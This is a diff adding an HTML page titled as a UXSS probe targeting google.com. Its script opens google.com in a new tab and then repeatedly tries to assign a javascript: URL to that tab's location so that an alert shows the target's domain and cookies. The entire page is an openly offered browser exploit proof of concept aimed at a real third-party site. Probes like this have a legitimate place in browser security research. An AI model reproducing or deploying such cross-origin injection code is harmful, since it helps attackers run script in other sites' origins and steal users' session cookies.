@@ -1,0 +1,46 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UXSS probe — window.open + javascript:</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:24px;line-height:1.6}
+  button{background:#d92d20;color:#fff;border:0;border-radius:8px;padding:14px 24px;font-size:16px;font-weight:600;cursor:pointer}
+  #log{white-space:pre-wrap;background:#0f1115;color:#d7e0ea;border-radius:8px;padding:12px 14px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;min-height:60px;margin-top:18px}
+  .ok{color:#38d39f}.bad{color:#ff8a80} code{background:#eee;padding:1px 5px;border-radius:4px}
+</style>
+</head>
+<body>
+<h1>UXSS probe — target google.com</h1>
+<p>Attacker origin = this page. Target origin = <code>google.com</code>. Tap the button; a tab opens google.com, then this page tries to run a <code>javascript:</code> URL inside it.</p>
+<button id="go">Open google.com, then inject</button>
+<div id="log">ready.</div>
+
+<script>
+var w = null;
+function log(m, cls){ var e=document.getElementById('log'), d=document.createElement('div'); if(cls)d.className=cls; d.textContent=m; e.appendChild(d); }
+
+// The success payload runs in the TARGET window's context. If it runs in google.com,
+// document.domain / document.cookie belong to google => UXSS proven.
+var PAYLOAD = "javascript:alert('pwned by 33x @ '+document.domain+' :: cookie='+document.cookie)";
+
+document.getElementById('go').addEventListener('click', function(){
+  w = window.open('https://www.google.com/', '_blank');
+  if(!w){ log('popup blocked — allow popups and retry.', 'bad'); return; }
+  log('opened google.com. Injecting javascript: after it loads (cross-origin)...');
+  // inject after google.com has committed cross-origin (so we are truly crossing origins)
+  setTimeout(function(){ inject('w.location'); }, 2500);
+  setTimeout(function(){ inject('w.location.href'); }, 3500);
+});
+
+function inject(how){
+  try{
+    if(how === 'w.location') w.location = PAYLOAD;
+    else w.location.href = PAYLOAD;
+    log('[try '+how+'] attempted.');
+  }catch(e){ log('[try '+how+'] threw: '+e.name+' '+e.message, 'bad'); }
+}
+</script>
+</body>
+</html>
